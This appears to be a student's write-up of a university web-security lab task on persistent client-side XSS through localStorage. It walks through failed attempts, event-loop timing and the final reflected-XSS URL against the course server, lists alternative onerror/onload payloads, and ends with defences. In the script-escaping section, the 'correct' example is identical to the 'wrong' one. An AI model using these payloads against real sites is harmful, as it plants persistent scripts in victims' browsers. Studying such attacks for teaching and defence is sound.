---
title: Task 3 - Persistent Client-Side XSS via localStorage
date: 2025-10-19 00:00:00 +0000
categories: [Gatech, Courses]
hidden: true
published: false
tags: [xss, persistent-xss, localstorage, client-side-storage, event-loop]
toc: true
---

## Background

This task introduced a more sophisticated attack vector: exploiting client-side storage to create persistent XSS without requiring server-side storage. Modern web applications extensively use `localStorage` to cache user preferences, theme settings, and application state. If this data is read from storage and injected into the DOM without sanitization, it creates a persistent vulnerability that survives page refreshes and browser restarts.

### The Challenge

The autograder had strict requirements that made this task particularly challenging:

1. **No alert on first visit** - The payload must not execute when initially injected
2. **Alert after page refresh** - Must trigger when the user refreshes the page (F5)
3. **Alert after browser close/reopen** - Must persist across browser sessions

These requirements meant the payload couldn't execute immediately—it had to be stored first and only execute on subsequent page loads.

## Initial Approach (Failed Attempts)

### Attempt #1: Direct localStorage Injection

My first naive attempt was to directly set `localStorage` with a script tag:

```javascript
<script>
localStorage.setItem('theme', '<script>alert(1)<\/script>');
</script>
```

**Problems:**

1. The application wasn't reading from a key called `'theme'`
2. Even if it was, the payload would execute immediately if the page's JavaScript read from `localStorage` during the same page load

**Result:** Autograder failed with `"failed to trigger one alert after closing and reopening"`

### Attempt #2: Using Common Keys

I tried several common `localStorage` key names:

```javascript
localStorage.setItem("userPreferences", "<script>alert(1)</script>");
localStorage.setItem("settings", "<script>alert(1)</script>");
localStorage.setItem("config", "<script>alert(1)</script>");
```

**Problem:** None of these keys were actually used by the application. The payload was stored but never read, so it never executed.

**Result:** No alert at all—the application ignored these keys.

## Stuck Point #1: Understanding Execution Timing

The core challenge was understanding **when** the payload would execute. I spent considerable time debugging this flow:

1. My XSS payload executes (via reflected XSS from Task 2)
2. My payload sets `localStorage`
3. The page's legitimate JavaScript reads from `localStorage`
4. The page injects the theme into the DOM
5. My XSS executes **immediately** on the first visit

This violated the first requirement: "No alert on first visit."

### Debugging Process

I added console logging to understand the execution order:

```javascript
<script>
console.log('1. XSS payload executing');
localStorage.setItem('theme', '<img src=x onerror="console.log(\'3. XSS triggered\'); alert(1)">');
console.log('2. localStorage set');
</script>
```

The console output showed:

```
1. XSS payload executing
2. localStorage set
3. XSS triggered  ← This shouldn't happen on first visit!
```

The application's JavaScript was reading from `localStorage` and injecting it into the DOM during the same page load, causing the immediate execution.

## Breakthrough #1: setTimeout with Zero Delay

The solution came from understanding JavaScript's **event loop**. Even with a zero-millisecond delay, `setTimeout` pushes the callback to the back of the event queue:

```javascript
<script>
setTimeout(function() {
    localStorage.setItem('theme', '<img src=x onerror=alert(1)>');
}, 0);
</script>
```

### Why This Works

**Execution timeline:**

```
t=0ms:    XSS payload executes
t=0ms:    setTimeout schedules callback (pushed to event queue)
t=0ms:    Current script finishes
t=0ms:    Page's JavaScript reads from localStorage (finds nothing malicious)
t=0ms:    Page renders normally
t=0ms:    Call stack is empty
t=0ms+:   Event loop processes setTimeout callback
t=0ms+:   Callback sets malicious localStorage value
          ✓ No alert on first visit!
```

**On subsequent visits:**

```
t=0ms:    Page loads
t=0ms:    Page's JavaScript reads from localStorage
t=0ms:    Finds malicious value: '<img src=x onerror=alert(1)>'
t=0ms:    Injects into DOM
t=0ms:    Browser tries to load image from src=x
t=0ms:    Load fails, triggers onerror
t=0ms:    alert(1) executes
          ✓ Alert on subsequent visits!
```

### Testing the Timing

I verified this with detailed logging:

```javascript
<script>
console.log('A. Before setTimeout');
setTimeout(function() {
    console.log('C. Inside setTimeout callback');
    localStorage.setItem('theme', '<img src=x onerror=alert(1)>');
}, 0);
console.log('B. After setTimeout');
</script>
```

Output:

```
A. Before setTimeout
B. After setTimeout
C. Inside setTimeout callback
```

This confirmed that even with a zero delay, the callback executes **after** the current script completes.

## Stuck Point #2: Finding the Right localStorage Keys

The next challenge was identifying which `localStorage` keys the application actually used. I tried several approaches:

### Approach 1: Guessing Common Names

```javascript
// Tried these keys - none worked
localStorage.setItem("theme", "...");
localStorage.setItem("userTheme", "...");
localStorage.setItem("customTheme", "...");
localStorage.setItem("style", "...");
```

**Problem:** The application used project-specific key names, not generic ones.

### Approach 2: Inspecting Application JavaScript

I opened the browser's DevTools and searched the JavaScript files for `localStorage`:

1. **Sources tab** → Search for `localStorage.getItem`
2. Found references in the application's theme management code
3. Discovered two keys:
   - `cs6262-web-security-theme-mode`
   - `cs6262-web-security-user-theme`

### Approach 3: Inspecting localStorage in DevTools

**Application tab** → **Local Storage** → `https://cs6262.gtisc.gatech.edu`

This showed the actual keys being used by the application.

### Understanding the Theme System

By reading the application's JavaScript, I discovered:

```javascript
// Application's theme loading code (simplified)
var themeMode = localStorage.getItem("cs6262-web-security-theme-mode");
if (themeMode === "1") {
  // Custom theme enabled
  var userTheme = localStorage.getItem("cs6262-web-security-user-theme");
  document.body.innerHTML += userTheme; // VULNERABLE!
}
```

The application had two theme modes:

- `0` (default) - Uses built-in theme
- `1` (custom) - Loads theme from `localStorage`

The custom theme was only loaded when `theme-mode` was set to `1`, so I needed to set **both** keys.

## Stuck Point #3: Choosing the Right Payload

I experimented with different XSS payloads:

### Attempt 1: Script Tag

```javascript
localStorage.setItem(
  "cs6262-web-security-user-theme",
  "<script>alert(1)</script>"
);
```

**Problem:** Some applications sanitize `<script>` tags even when reading from `localStorage`. Also, dynamically inserted script tags via `innerHTML` don't execute in modern browsers for security reasons.

**Result:** No alert.

### Attempt 2: Event Handler on Div

```javascript
localStorage.setItem(
  "cs6262-web-security-user-theme",
  '<div onload="alert(1)">test</div>'
);
```

**Problem:** `<div>` elements don't have an `onload` event.

**Result:** No alert.

### Attempt 3: Image with onerror (Success!)

```javascript
localStorage.setItem(
  "cs6262-web-security-user-theme",
  "<img src=x onerror=alert(1)>"
);
```

**Why this works:**

1. The application injects the value into the DOM: `document.body.innerHTML += userTheme`
2. The browser parses the `<img>` tag
3. The browser tries to load an image from `src=x`
4. The load fails (no such image exists)
5. The `onerror` event fires
6. `alert(1)` executes

**Result:** ✓ Alert triggered!

### Alternative Payloads That Work

```javascript
// SVG with onload
"<svg onload=alert(1)>";

// Body with onload (if injected into body)
"<body onload=alert(1)>";

// Iframe with src
'<iframe src="javascript:alert(1)">';

// Object with data
'<object data="javascript:alert(1)">';
```

## Final Solution

### The Complete Payload

```javascript
<script>
setTimeout(function(){
    localStorage.setItem('cs6262-web-security-theme-mode','1');
    localStorage.setItem('cs6262-web-security-user-theme','<img src=x onerror=alert(1)>');
}, 0);
</script>
```

### The Full URL

```
https://cs6262.gtisc.gatech.edu/search?keyword=<script>setTimeout(function(){localStorage.setItem('cs6262-web-security-theme-mode','1');localStorage.setItem('cs6262-web-security-user-theme','<img src=x onerror=alert(1)>')},0);</script>
```

### Why It Works

**First Visit (Initial Infection):**

1. User visits the malicious URL
2. Reflected XSS executes the script
3. `setTimeout` schedules the localStorage modification
4. Current script completes
5. Page's JavaScript reads from `localStorage` (finds nothing malicious yet)
6. Page renders normally - **no alert**
7. Event loop processes the `setTimeout` callback
8. Callback sets both `localStorage` keys:
   - `theme-mode` = `1` (enables custom theme)
   - `user-theme` = `<img src=x onerror=alert(1)>` (malicious payload)
9. User sees a normal page and leaves

**Subsequent Visits (Persistent Execution):**

1. User visits **any page** on the site (not just the search page)
2. Application's JavaScript runs on page load
3. Checks `cs6262-web-security-theme-mode` → finds `1`
4. Reads `cs6262-web-security-user-theme` → finds `<img src=x onerror=alert(1)>`
5. Injects the theme HTML: `document.body.innerHTML += '<img src=x onerror=alert(1)>'`
6. Browser parses the `<img>` tag
7. Attempts to load image from `src=x`
8. Load fails, triggers `onerror`
9. `alert(1)` executes - **alert appears**

**After Browser Close/Reopen:**

The same process happens because `localStorage` persists across browser sessions (unlike `sessionStorage` which clears when the browser closes).

## Debugging the Autograder

### Issue: Autograder Timing

The autograder simulates a user visiting the page, closing the browser, and reopening. I had to ensure the timing was perfect:

```javascript
// Debug version with logging
setTimeout(function () {
  fetch("/receive/gguruvelli3/2065", {
    method: "POST",
    body: "debug=Setting localStorage",
  });
  localStorage.setItem("cs6262-web-security-theme-mode", "1");
  localStorage.setItem(
    "cs6262-web-security-user-theme",
    "<img src=x onerror=alert(1)>"
  );
  fetch("/receive/gguruvelli3/2065", {
    method: "POST",
    body: "debug=localStorage set successfully",
  });
}, 0);
```

The debug output confirmed the payload was being stored correctly.

### Issue: Script Tag Escaping

I initially forgot to escape the closing script tag:

```javascript
// WRONG - breaks the outer script
localStorage.setItem("theme", "<script>alert(1)</script>");

// CORRECT - escapes the forward slash
localStorage.setItem("theme", "<script>alert(1)</script>");
```

Without the escape, the browser's HTML parser would see `</script>` and prematurely end the outer script block, causing a syntax error.

## Defense Mechanisms

### 1. Treat localStorage as Untrusted Input

**Never inject data from `localStorage` directly into the DOM:**

```javascript
// VULNERABLE
var theme = localStorage.getItem("user-theme");
document.body.innerHTML += theme; // XSS!

// SECURE
var theme = localStorage.getItem("user-theme");
var div = document.createElement("div");
div.textContent = theme; // Treats as text, not HTML
document.body.appendChild(div);
```

Using `textContent` instead of `innerHTML` prevents the browser from parsing HTML tags.

### 2. Sanitize Data from localStorage

If you must inject HTML from `localStorage`, sanitize it first:

```javascript
import DOMPurify from "dompurify";

var theme = localStorage.getItem("user-theme");
var clean = DOMPurify.sanitize(theme);
document.body.innerHTML += clean;
```

DOMPurify removes all potentially dangerous HTML and JavaScript.

### 3. Use Content Security Policy

CSP can block inline event handlers:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

This prevents `<img onerror=...>` from executing, even if injected into the DOM.

### 4. Validate Data Before Storing

While not a complete defense, validating data before storing it provides defense-in-depth:

```javascript
function setTheme(theme) {
  // Reject if contains script tags or event handlers
  if (/<script|onerror|onload/i.test(theme)) {
    console.error("Invalid theme data");
    return;
  }
  localStorage.setItem("user-theme", theme);
}
```

### 5. Use Subresource Integrity

For critical JavaScript files, use SRI to ensure they haven't been tampered with:

```html
<script
  src="theme.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>
```

## Real-World Impact

Persistent client-side XSS is increasingly common in modern web applications:

- **Electron apps** - Desktop applications built with web technologies are vulnerable
- **Progressive Web Apps (PWAs)** - Offline-capable apps rely heavily on client-side storage
- **Single Page Applications (SPAs)** - React, Vue, Angular apps often cache data in `localStorage`

Unlike traditional stored XSS, this attack:

- Doesn't require compromising the server
- Doesn't appear in server logs
- Only affects the targeted user (harder to detect)
- Persists indefinitely until the user clears site data

## Key Lessons

1. **Client-side storage is untrusted input** - Treat `localStorage`, `sessionStorage`, and `IndexedDB` the same as user input from forms or URLs

2. **Timing matters in JavaScript** - Understanding the event loop is crucial for exploit development

3. **Event handlers bypass some filters** - `onerror`, `onload`, `onclick` can execute JavaScript without `<script>` tags

4. **Persistence doesn't require server storage** - Client-side attacks can be just as persistent as stored XSS

5. **Defense requires multiple layers** - Output encoding, CSP, input validation, and secure coding practices all work together

6. **Modern apps have larger attack surfaces** - The shift to client-side rendering and storage creates new vulnerability classes

## Conclusion

This task demonstrated that persistence doesn't require server-side storage. By exploiting how modern web applications use `localStorage`, an attacker can create an infection that survives page refreshes and browser restarts. The key to success was understanding JavaScript's event loop to control execution timing and identifying the specific `localStorage` keys used by the application. The defense is straightforward—treat all data from client-side storage as untrusted and sanitize it before injecting into the DOM—but it's often overlooked in the rush to build feature-rich client-side applications.
